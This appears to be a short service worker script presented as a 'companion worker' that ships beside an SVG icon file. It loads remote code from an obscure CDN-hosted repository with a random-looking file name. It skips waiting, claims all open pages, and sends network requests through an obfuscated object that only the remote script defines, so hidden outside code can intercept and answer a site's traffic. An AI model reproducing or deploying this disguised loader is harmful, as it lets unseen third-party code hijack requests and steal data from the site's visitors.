/* Geekfox companion worker. Keep beside index.svg when publishing. */
self.__requestWorkerActivation = () => self.skipWaiting();
importScripts('https://cdn.jsdelivr.net/gh/lucideproxy/svg@8b35ef07ef9788b060a78fbb504112e28e134b1d/dfkw6/otzrpt.js');
self.addEventListener('install', event => event.waitUntil(self.skipWaiting()));
self.addEventListener('activate', event => event.waitUntil(self.clients.claim()));
self.addEventListener('fetch', event => {
    if (_zm9ikyq.shouldRoute(event)) event.respondWith(_zm9ikyq.route(event));
});
